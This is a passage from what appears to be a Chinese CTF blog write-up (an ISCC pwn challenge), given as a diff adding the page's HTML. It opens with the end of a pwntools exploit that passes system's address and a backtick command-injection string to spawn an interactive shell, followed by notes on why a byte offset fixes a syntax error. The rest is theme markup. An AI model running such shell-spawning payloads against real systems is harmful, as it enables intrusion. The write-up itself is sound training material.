p32(system_addr)+b&quot;`;$0&quot;<br>print(payload)<br>new(b&#x27;8&#x27;,payload)<br>debug()<br>show(b&#x27;1&#x27;)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p>另：经实验，确实有语法错误会导致不能执行</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/7fdfe7464b5dc7711450d.png" srcset="/img/loading.gif" lazyload alt="image-20240513125021642"></p>
+<p>所以说跳过第一个endbr32就能让它执行还不懂:dog:</p>
+<p>提交的时候发现+4之后，64就是d了，就不是反引号了，不会报语法错误了，所以就能执行了，与endbr32无关！</p>
+<p>0x60对应的是反引号，0x64对应的是d</p>
+<p><img src="https://telegraph-image-5jy.pages.dev/file/2a6fa3461c47a2c340905.png" srcset="/img/loading.gif" lazyload alt="image-20240513134737062"></p>
+<p>至于其他的为啥不行，虽然不是反引号了，但是影响了system的正常执行。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://xyyr-c.github.io/2024/10/23/iscc-U/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xyyr</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/23/%E9%99%90%E5%88%B67%E5%AD%97%E8%8A%82%E5%86%99%E5%85%A5%E6%89%A7%E8%A1%8C%E7%9A%84orw/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/23/orange_cat/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo-6gxh6ogsm-xyyrs-projects.vercel.app/","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
